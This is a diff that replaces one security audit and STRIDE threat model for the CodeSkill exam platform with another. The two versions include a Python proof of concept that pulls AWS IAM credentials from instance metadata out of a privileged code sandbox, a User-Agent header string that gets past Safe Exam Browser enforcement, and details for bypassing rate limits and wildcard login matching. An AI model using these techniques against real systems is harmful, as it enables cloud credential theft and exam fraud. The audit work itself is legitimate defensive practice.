@@ -1,188 +1,143 @@
-# Independent Pre-Production Engineering Audit: Security Assessment & Threat Model
+# 04. COMPREHENSIVE SECURITY ASSESSMENT & THREAT MODEL
 
-**Target Commit:** `3a3e9671d863e8abd95d19cbc7136c4227476ba8`  
-**Discipline:** Application Security Architect & Threat Modeling Engineer  
-**Classification:** Complete Independent Security Evaluation  
-
----
-
-## 1. Threat Modeling (STRIDE Methodology)
-
-An exhaustive STRIDE threat model was conducted across the CodeSkill application architecture, covering student workflows, examination environments, code compilation sandboxes, and administrative interfaces.
-
-```mermaid
-graph TD
-    subgraph "External Threats"
-        Attacker[Hostile Actor / Malicious Student]
-    end
-
-    subgraph "Trust Boundary: Edge & Network"
-        ALB[AWS ALB - WAF / TLS]
-    end
-
-    subgraph "Trust Boundary: Application Core"
-        API[NestJS API Gateway]
-        SEB[Safe Exam Browser Guard]
-        Auth[JWT / Refresh Token Service]
-        Assess[Assessment Service]
-    end
-
-    subgraph "Trust Boundary: Execution Sandbox"
-        Worker[Judge Worker]
-        Piston[Piston Runner]
-    end
-
-    subgraph "Trust Boundary: Data & Storage"
-        RDS[(PostgreSQL)]
-        Redis[(ElastiCache Redis)]
-        S3[(AWS S3 Media Bucket)]
-    end
-
-    Attacker -->|Threat: Spoofed User-Agent| SEB
-    Attacker -->|Threat: Credential Replay| Auth
-    Attacker -->|Threat: RCE / Sandbox Escape| Piston
-    Attacker -->|Threat: Insecure Direct Object Access| Assess
-    Assess -->|Threat: Lost Updates| RDS
-    Assess -->|Threat: Unsigned Fallback URL| S3
-    Worker -->|Threat: Memory Exhaustion| Redis
-```
-
-### STRIDE Assessment Summary
-
-| Threat Category | Target Component | Identified Vulnerability / Risk | Severity | Status |
-| :--- | :--- | :--- | :---: | :---: |
-| **Spoofing** | Exam Security Service | User-Agent regex spoofing allows arbitrary browsers to masquerade as SEB (`ISSUE-SEC-001`). | **CRITICAL** | **UNRESOLVED** |
-| **Spoofing** | Exam Token Minting | Static fallback secret `'codeskill-secure-exam-token-secret'` allows offline HMAC token forgery (`ISSUE-SEC-003`). | **HIGH** | **UNRESOLVED** |
-| **Tampering** | Assessment Progress | Concurrent autosaves overwrite and delete proctoring captures or answers (`ISSUE-CONCUR-001`). | **CRITICAL** | **UNRESOLVED** |
-| **Repudiation** | Proctoring Audit Trail | Overwritten proctoring captures destroy non-repudiation evidence of academic dishonesty. | **CRITICAL** | **UNRESOLVED** |
-| **Information Disclosure** | S3 Proctoring Storage | Fallback to unsigned S3 URLs in private buckets causes access failures or leak risks (`ISSUE-SEC-002`). | **HIGH** | **UNRESOLVED** |
-| **Denial of Service** | Code Execution Engine | Piston multi-compilation loop triggers 100% CPU saturation and 504 timeouts (`ISSUE-EXEC-001`). | **CRITICAL** | **UNRESOLVED** |
-| **Denial of Service** | Queue / Redis | Shared Redis with `noeviction` policy crashes submission queues when cache fills (`ISSUE-INFRA-002`). | **CRITICAL** | **UNRESOLVED** |
-| **Elevation of Privilege**| Question AI Wizard | Mixed-content `http://localhost:5000` exposes unauthenticated AI generation triggers (`ISSUE-FE-001`). | **HIGH** | **UNRESOLVED** |
+**Target Commit:** `7c83df6ef13915c1171dd4b3e61f31a0c24306e2`  
+**Discipline:** Application Security Architect, Threat Modeling Engineer, Cloud Infrastructure Security Engineer  
+**Baseline Standard:** OWASP ASVS v4.0.3 (Level 2 Baseline, Level 3 for High-Assurance Examination Modules) & OWASP Top 10:2021 / API Security Top 10:2023
 
 ---
 
-## 2. Deep Dive: Proctoring Security & Safe Exam Browser (SEB)
+## 1. Threat Modeling (STRIDE Analysis)
 
-### 2.1 Vulnerability Analysis: User-Agent Spoofing Bypass (`ISSUE-SEC-001`)
-The CodeSkill platform provides examination environments with a `requireSEB` enforcement switch. When enabled, students must run the exam within Safe Exam Browser, which locks down the workstation OS, blocks virtual machines, disables clipboard copying, and blocks external browser tabs.
-
-In `backend-nestjs/src/exam-security/exam-security.service.ts`:
-```typescript
-const sebReqHash =
-  (headers?.['x-safeexambrowser-requesthash'] as string) ||
-  (headers?.['x-safeexambrowser-confighash'] as string) ||
-  (headers?.['x-safeexambrowser-configkeyhash'] as string);
-const userAgent = String(headers?.['user-agent'] || '');
-const isSebUserAgent = /SEB|SafeExamBrowser/i.test(userAgent);
-const hasSebHeader = Boolean(sebReqHash);
-
-const clientType = (hasSebHeader || isSebUserAgent) ? 'SEB' : 'BROWSER';
-```
-If an assessment sets `requireSEB: true` but omits `securityPolicy.configKey` (which is an optional configuration property):
-1. Lines 62–113: The cryptographic verification block (`if (security.configKey)`) is completely skipped.
-2. The check on Line 55 (`if (clientType !== 'SEB')`) is satisfied simply if `isSebUserAgent` is true.
-3. Any HTTP client or Chrome extension that sets the HTTP request header:
-   `User-Agent: Mozilla/5.0 SafeExamBrowser/3.4.0`
-   is immediately granted an authenticated session with `clientType = 'SEB'`.
-4. The candidate takes the high-stakes exam in standard Chrome without any operating system lockdown.
-
-### 2.2 SEB Request Hash Verification Inconsistencies
-When `security.configKey` IS configured:
-Safe Exam Browser generates the `X-SafeExamBrowser-RequestHash` by hashing the exact full requested URL concatenated with the Config Key:
-$$\text{Hash} = \text{SHA256}(\text{RequestURL} + \text{ConfigKey})$$
-In `exam-security.service.ts` (lines 77–80):
-```typescript
-const validCandidateHashes: string[] = [
-  crypto.createHash('sha256').update(assessment.id + expectedConfigKey).digest('hex'),
-  crypto.createHmac('sha256', expectedConfigKey).update(assessment.id).digest('hex'),
-];
-```
-Notice that the server permits candidate hashes constructed purely from `assessment.id + expectedConfigKey`. This was introduced to facilitate test mocks, but it weakens the protocol: an attacker who knows the exam ID and guesses or extracts the configuration key can authenticate without transmitting a genuine URL-derived hash.
+| **Threat Category** | **Target Subsystem** | **Threat Scenario** | **Existing Mitigation** | **Residual Risk & Vulnerability** |
+|---|---|---|---|---|
+| **Spoofing Identity** | `AuthService.login` & `SmartThrottlerGuard` | Attacker spoofs client IP via `X-Forwarded-For` or guesses accounts via wildcard ILIKE (`%`, name prefix). | Smart throttler checks token first. | **HIGH (ISSUE-SEC-002, ISSUE-SEC-003)**: Rate-limiting completely bypassed; account lookup matches ambiguous users. |
+| **Tampering With Data** | `ContestsService` & `AssessmentsService` | Concurrent modification of reattempt grants or scorecards during network blips; unshielded ALB endpoints. | DB unique constraints on `(contest_id, user_id, attemptNumber)`. | **HIGH (ISSUE-CON-001, ISSUE-INF-005)**: Race condition consumes grant and crashes transaction; missing WAF leaves public ALB unshielded. |
+| **Repudiation** | `AuditLog` & `ExamSecurityEvents` | Candidate claims exam auto-submit or proctor penalty was an error or unauthorized action. | Event logging in `exam_security_events` table. | **MEDIUM**: Captures stored in S3; client violations accept client-side timestamps without server clock reconciliation. |
+| **Information Disclosure** | Cloud Metadata, ElastiCache Redis, S3 Reports | Code sandbox makes HTTP request to IMDSv2 (`169.254.169.254`); Redis traffic in plaintext; S3 unencrypted. | IMDSv2 token required. | **CRITICAL (ISSUE-SEC-001, ISSUE-SEC-004, ISSUE-INF-006)**: Hop limit 2 allows container to fetch token; Redis unencrypted; S3 reports co-mingled with public avatars without default SSE. |
+| **Denial of Service** | Assessment Submissions & Bulk Import | 500 students submit exam simultaneously; admin imports 2,000 students via CSV; ASG startup DDL race. | Throttler limits; Nginx timeout. | **CRITICAL (ISSUE-PRF-001, ISSUE-PRF-002, ISSUE-INF-003)**: Synchronous execution freezes server; bcrypt blocks event loop; ASG startup runs concurrent DDL deadlocks. |
+| **Elevation of Privilege** | Piston Execution Host & Backend IAM Role | Untrusted student code escapes container; compromised backend extracts all AWS account secrets. | Non-root `piston` user in container. | **CRITICAL (ISSUE-SEC-001, ISSUE-INF-004)**: Container executed with `--privileged`; backend IAM policy grants `"Resource": "*"` on Secrets Manager & SSM. |
 
 ---
 
-## 3. Authentication & Session Management
+## 2. Sandbox Escape & Cloud Infrastructure Vector (ISSUE-SEC-001)
 
-### 3.1 Token Entropy & Placeholder Validation (`jwt.config.ts`)
-The authentication architecture enforces rigorous JWT secret validation rules at startup:
-- Minimum secret length: 32 characters (`MIN_JWT_SECRET_LENGTH`).
-- Blacklisted placeholder detection: Automatically rejects known repository placeholders (`supersecretcodeskilljwt`, `changeme`, etc.).
-- Entropy check: Aborts startup if the secret contains fewer than 8 unique characters.
-- Ephemeral fallback: Outside of production (`NODE_ENV=development|test`), missing secrets generate a secure 48-byte random hex string (`randomBytes(48)`), preventing predictable secret attacks.
+### 2.1 Attack Surface Analysis
 
-### 3.2 Refresh Token Rotation & Family Revocation (`token.service.ts`)
-The refresh token system implements state-of-the-art token rotation with replay detection:
-- Tokens are stored as SHA-256 hashes (`tokenHash`); raw tokens are never persisted in plaintext.
-- Atomic CAS consumption: When rotating a token, TypeORM executes an atomic update:
-  ```typescript
-  const consumed = await this.refreshTokens.update(
-    { id: row.id, revokedAt: IsNull() },
-    { revokedAt: new Date() },
-  );
-  ```
-- Replay Protection: If an already-revoked refresh token is re-submitted after a 10-second grace window, the entire token family (`familyId`) is immediately revoked, protecting against compromised client storage.
-
-### 3.3 Exam Token Hardcoded Secret Fallback (`ISSUE-SEC-003`)
-In direct contrast to `jwt.config.ts`, `exam-security.service.ts` lines 161–165 contains a hardcoded fallback string:
-```typescript
-const sessionSecret = process.env.JWT_SECRET || 'codeskill-secure-exam-token-secret';
+The Piston service executes untrusted code submitted by arbitrary students. In `terraform/environments/production/userdata/piston.sh.tftpl`:
+```sh
+ExecStart=/usr/bin/docker run --rm --name codeskill-piston \
+  -p 2001:2000 \
+  -v /var/lib/piston:/piston \
+  --privileged \
+  $PISTON_IMAGE
 ```
-If `JWT_SECRET` is unset or fails to propagate to the NestJS runtime environment, exam session tokens are signed with `'codeskill-secure-exam-token-secret'`. Because this string is committed to source control, it presents an immediate cryptographic forgery risk.
+1. **The `--privileged` Flag:**
+   Running a Docker container with `--privileged` disables Linux seccomp profiles, AppArmor/SELinux confinement, and provides the container with direct access to host kernel devices (`/dev/*`). Any container escape (e.g. mounting host `/dev/xvda` or exploiting kernel vulnerabilities) yields root on the underlying EC2 host.
+2. **Missing Network Isolation Flag:**
+   The compose definition in `deployment/piston/compose.yaml` explicitly includes `PISTON_DISABLE_NETWORKING: 'true'`. However, in production Terraform userdata, this environment variable was **completely omitted**.
+3. **IMDSv2 Hop Limit = 2:**
+   `terraform/modules/ec2-asg/main.tf:28` configures:
+   ```tf
+   metadata_options {
+     http_endpoint               = "enabled"
+     http_tokens                 = "required"
+     http_put_response_hop_limit = 2
+   }
+   ```
+   A hop limit of 2 allows packets originating from within a container network bridge (1 hop to host, 1 hop to link-local metadata) to acquire valid IMDSv2 session tokens.
+
+### 2.2 Proof of Concept Attack Mechanics (Theoretical Verification)
+```python
+# Malicious code submitted via POST /api/execution/run
+import urllib.request, json
+
+# 1. Acquire IMDSv2 Token (Hop limit = 2 succeeds from inside bridge container)
+req = urllib.request.Request("http://169.254.169.254/latest/api/token", method="PUT")
+req.add_header("X-aws-ec2-metadata-token-ttl-seconds", "300")
+token = urllib.request.urlopen(req).read().decode()
+
+# 2. Query attached IAM Role
+role_req = urllib.request.Request("http://169.254.169.254/latest/meta-data/iam/security-credentials/", method="GET")
+role_req.add_header("X-aws-ec2-metadata-token", token)
+role_name = urllib.request.urlopen(role_req).read().decode().strip()
+
+# 3. Exfiltrate temporary AWS credentials
+cred_req = urllib.request.Request(f"http://169.254.169.254/latest/meta-data/iam/security-credentials/{role_name}")
+cred_req.add_header("X-aws-ec2-metadata-token", token)
+credentials = json.loads(urllib.request.urlopen(cred_req).read().decode())
+print(f"Exfiltrated AccessKeyId: {credentials['AccessKeyId']}")
+```
+**Remediation:**
+- Configure `http_put_response_hop_limit = 1` across all ASG launch templates.
+- Remove `--privileged` and explicitly disable networking in production systemd unit: `-e PISTON_DISABLE_NETWORKING=true`.
 
 ---
 
-## 4. Object Storage & Media Security (`s3-presigner.util.ts`)
+## 3. Authentication & Authorization Assessment
 
-In commit `3a3e9671`, PR #96 introduced an in-tree AWS SigV4 URL signer (`s3-presigner.util.ts`) to avoid missing npm dependencies.
-However, lines 48–54 reveal a critical cloud security design flaw:
-```typescript
-const akId = accessKeyId || process.env.AWS_ACCESS_KEY_ID || '';
-const sk = secretAccessKey || process.env.AWS_SECRET_ACCESS_KEY || '';
+### 3.1 Authentication Implementation
+- **Password Storage:** Uses `bcryptjs` with configurable rounds (default 10 via `bcryptRounds()`). Passwords enforce a minimum 8 characters and 72-byte max length (`PASSWORD_MAX_BYTES`), correctly mitigating bcrypt silent 72-byte truncation vulnerabilities.
+- **Refresh Token Rotation:** `TokenService` implements single-use refresh token rotation with SHA-256 token hashing (`hashRefreshToken`) and family-based revocation (`familyId`). If a revoked token is reused outside the 10-second grace window, the entire family is immediately invalidated.
+- **Session Revocation:** Bumps `tokenVersion` on user record, immediately invalidating all active JWTs on the next HTTP request or WebSocket handshake.
 
-if (!akId || !sk) {
-  // If no static credentials exist, return the direct object URL
-  return `https://${bucket}.s3.${region}.amazonaws.com/${key}`;
-}
-```
+### 3.2 Authentication Vulnerabilities
+1. **Wildcard & Non-Unique Identifier Matching (ISSUE-SEC-002):**
+   `AuthService.login` matches users using:
+   ```ts
+   where: [
+     { email: ILike(raw) },
+     { uid: ILike(raw) },
+     { username: ILike(raw) },
+     { name: ILike(raw) },
+     { email: ILike(`${raw}@%`) },
+   ]
+   ```
+   - Unescaped `%` and `_` characters allow attackers to query the database with wildcard expressions.
+   - Matching by `name` is non-unique and insecure. If multiple students share a common name, login checks against whichever arbitrary row PostgreSQL returns first.
+2. **Client IP Rate-Limiting Bypass (ISSUE-SEC-003):**
+   `SmartThrottlerGuard` reads `req.headers['x-forwarded-for'].split(',')[0]`. Because clients can inject arbitrary `X-Forwarded-For` headers and Express `trust proxy` is unconfigured, attackers can bypass all unauthenticated throttles by rotating client-supplied headers.
 
-### Risk Assessment
-1. **Private Bucket Policy Violation:** Production S3 buckets storing student webcam captures and candidate identification photos are private (`BlockPublicAcls = true`, `BlockPublicPolicy = true`).
-2. **IAM Metadata Non-Support:** In AWS EC2 deployments using IAM Instance Profiles, static keys are omitted. When the fallback executes, it returns an unsigned URL. Any browser attempting to fetch the image receives an XML `AccessDenied (403)` error.
-3. **Session Token Omission:** Even if temporary IAM credentials were provided, the SigV4 query signer fails to include `X-Amz-Security-Token`, causing AWS S3 to reject the signature.
-
----
-
-## 5. Network & Infrastructure Security (Terraform Audit)
-
-### 5.1 Security Group Isolation
-Terraform configurations in `terraform/environments/production/main.tf` enforce clean multi-tier security group boundaries:
-- **ALB Security Group:** Allows ingress on port 443/80 from `0.0.0.0/0`.
-- **Frontend Security Group:** Allows port 3000 strictly from the ALB security group.
-- **Backend Security Group:** Allows port 5001 strictly from the ALB security group.
-- **Judge0 / Piston Security Group:** Allows port 2358/2000 strictly from backend instances.
-- **RDS & Redis Security Groups:** Allow ports 5432 and 6379 strictly from backend instances.
-
-### 5.2 Missing SSL Enforcement in Production Database (`ISSUE-INFRA-003`)
-In `terraform/environments/production/main.tf`:
-```hcl
-module "rds" {
-  source = "../../modules/rds"
-  # create_parameter_group is omitted, defaulting to false!
-}
-```
-Because `create_parameter_group = false`, the custom PostgreSQL parameter group containing `rds.force_ssl = 1` is **not deployed**. The database relies on AWS defaults where unencrypted client connections are permitted, presenting a clear compliance hazard.
+### 3.3 Authorization & Multi-Tenancy (BOLA / IDOR / BFLA)
+- **Problem Ownership:** `ProblemsService` strictly verifies problem author or admin status before modifications.
+- **Assessment Results & Proctoring Reports:** `ReportsController.getStudentResultReport` verifies `user.id === studentId || isAdmin`. If unauthorized, it returns 404 rather than 403, preventing resource enumeration.
+- **Contest Gate:** `AppGateway.handleJoinContest` verifies that the connecting socket belongs to a registered participant or platform admin before allowing them to subscribe to contest rooms.
+- **Campus & Company Portals:** Covered by explicit `CampusGuard` and `CompanyGuard` ensuring users cannot access batches or job applicants outside their institution.
 
 ---
 
-## 6. Security Remediation Action Plan
+## 4. Input Validation and Injection Analysis
 
-1. **SEB Protocol Hardening (Immediate):**
-   - Require `securityPolicy.configKey` whenever `requireSEB` is enabled.
-   - Refuse any request where `X-SafeExamBrowser-RequestHash` is missing or does not cryptographically match the request URL.
-2. **Centralize Cryptographic Secrets (Immediate):**
-   - Remove `'codeskill-secure-exam-token-secret'` from `exam-security.service.ts`; inject validated secrets from `ConfigService`.
-3. **S3 Presigner Integration (Phase 2):**
-   - Ensure `@aws-sdk/s3-request-presigner` is installed in `backend-nestjs/package.json` and utilize the official AWS SDK v3 client that resolves IAM instance profile roles natively.
-4. **Terraform Parameter Group Attachment (Phase 2):**
-   - Explicitly pass `create_parameter_group = true` in `terraform/environments/production/main.tf` to mandate SSL connections to RDS.
+| Injection Vector | Audit Status | Code Location | Finding / Assessment |
+|---|---|---|---|
+| **SQL Injection** | **VERIFIED CLEAN** | Repository / QueryBuilder | All TypeORM queries use parameterized variables (`$1, $2`) or object criteria. No raw string interpolations detected. |
+| **Prototype Pollution** | **VULNERABLE (ISSUE-SEC-005)** | `StudentsService:372` | Uses `xlsx 0.18.5` (CVE-2023-30533) to parse untrusted spreadsheets uploaded by administrators. |
+| **Cross-Site Scripting (XSS)** | **VERIFIED CLEAN** | Next.js Frontend | Next.js JSX automatically escapes rendered values. `dangerouslySetInnerHTML` is restricted to markdown renderers with sanitized HTML. |
+| **Path Traversal** | **VERIFIED CLEAN** | `S3Service:133, 162` | S3 key generation rejects any key containing `..` or lacking approved prefixes (`proctoring/`, `avatars/`). |
+| **Server-Side Request Forgery (SSRF)** | **CRITICAL (ISSUE-SEC-001)** | `piston.sh.tftpl` | Enabled in Piston sandbox due to missing network isolation flag and hop limit = 2. |
+| **Mass Assignment** | **VERIFIED CLEAN** | `main.ts:145` | Global `ValidationPipe` with `whitelist: true` strips non-whitelisted payload properties. |
+
+---
+
+## 5. OWASP ASVS v4.0.3 Compliance Benchmark
+
+| ASVS Verification Chapter | Level 2 Standard | Implementation Status | Non-Compliance Finding |
+|---|---|---|---|
+| **V1: Architecture & Threat Modeling** | L2 | **PARTIALLY COMPLIANT** | Untrusted code sandbox lacks network boundary; missing RDS connection pooler. |
+| **V2: Authentication** | L2 | **COMPLIANT WITH CAVEAT** | Bcrypt salting and token rotation compliant; wildcard matching (`ISSUE-SEC-002`) violates V2.1. |
+| **V3: Session Management** | L2 | **COMPLIANT** | Token versioning, family revocation, short-lived JWTs (15m) compliant with V3.3. |
+| **V4: Access Control** | L2 | **COMPLIANT** | Explicit role guards and ownership verification on critical endpoints. |
+| **V5: Validation & Sanitization** | L2 | **PARTIALLY COMPLIANT** | Input whitelisting compliant; spreadsheet parser contains unpatched CVEs (`ISSUE-SEC-005`). |
+| **V8: Data Protection** | L2 | **NON-COMPLIANT** | ElastiCache Redis unencrypted in transit and at rest (`ISSUE-SEC-004`). |
+| **V13: API & Web Service** | L2 | **PARTIALLY COMPLIANT** | Rate limiting bypassed via spoofed `X-Forwarded-For` (`ISSUE-SEC-003`). |
+| **V14: Configuration** | L2 | **NON-COMPLIANT** | Piston runs `--privileged` without network isolation (`ISSUE-SEC-001`). |
+
+---
+
+## 6. Security Testing & Verification Gaps
+
+1. **Automated DAST / Penetration Testing:**
+   No dynamic application security testing (OWASP ZAP, Burp Suite) is integrated into CI/CD pipelines.
+2. **Container Security Scanning:**
+   Docker images pushed to Amazon ECR rely on basic scan-on-push; no continuous vulnerability alerting for base images.
+3. **Automated Secret Scanning:**
+   Git hooks do not enforce `trufflehog` or `git-secrets` before commits are pushed to remote repositories.
